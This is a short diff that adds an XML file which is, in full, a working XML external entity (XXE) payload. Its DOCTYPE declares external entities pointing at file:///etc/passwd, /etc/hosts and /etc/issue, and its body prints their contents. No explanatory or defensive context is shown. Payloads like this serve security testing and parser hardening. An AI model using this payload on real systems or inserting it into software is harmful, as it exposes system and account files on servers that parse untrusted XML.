@@ -1,0 +1,17 @@
+<?xml-stylesheet type="text/xml" href=""?>
+<!DOCTYPE p [
+<!ENTITY passwd SYSTEM "file:///etc/passwd">
+<!ENTITY hosts SYSTEM "file:///etc/hosts">
+<!ENTITY issue SYSTEM "file:///etc/issue">
+]> 
+<p>
+<p>/etc/passwd: 
+    &passwd;
+</p>
+<p>/etc/hosts:
+    &hosts;
+</p>
+<p>/etc/issue:
+    &issue;
+</p>
+</p>
